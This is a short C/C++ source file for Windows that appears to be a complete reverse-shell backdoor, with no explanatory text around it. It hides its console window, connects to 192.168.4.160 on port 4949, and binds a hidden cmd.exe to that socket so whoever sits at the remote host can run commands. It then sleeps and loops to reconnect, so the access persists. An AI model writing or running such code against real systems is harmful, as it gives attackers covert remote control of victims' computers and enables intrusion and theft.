#define _WIN32_WINNT 0x0500
#include <winsock2.h> 
#include <stdio.h> 
using namespace std; 
int main(int argc, char *argv[]) 
{ 
     HWND hWnd = GetConsoleWindow();
   ShowWindow( hWnd, SW_HIDE ); 
   ancora:
        Sleep(10000);
        WSADATA wsaData; 
        SOCKET hSocket; 
        STARTUPINFO si; 
        PROCESS_INFORMATION pi; 
        struct sockaddr_in adik_sin; 
        memset(&adik_sin,0,sizeof(adik_sin)); 
        memset(&si,0,sizeof(si)); 
        WSAStartup(MAKEWORD(2,0),&wsaData); 
        hSocket = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL); 
        adik_sin.sin_family = AF_INET; 
        adik_sin.sin_port = htons(4949); 
        adik_sin.sin_addr.s_addr = inet_addr("192.168.4.160"); 
        connect(hSocket,(struct sockaddr*)&adik_sin,sizeof(adik_sin)); 
        si.cb = sizeof(si); 
		si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;//
		si.wShowWindow = SW_HIDE;//
		si.hStdInput = si.hStdOutput = si.hStdError = (void *)hSocket; 
        CreateProcess(NULL,"cmd",NULL,NULL,true,NULL,NULL,NULL,&si,&pi); 
      //  ExitProcess(0); 
      Sleep(100000);
      goto ancora;
} 
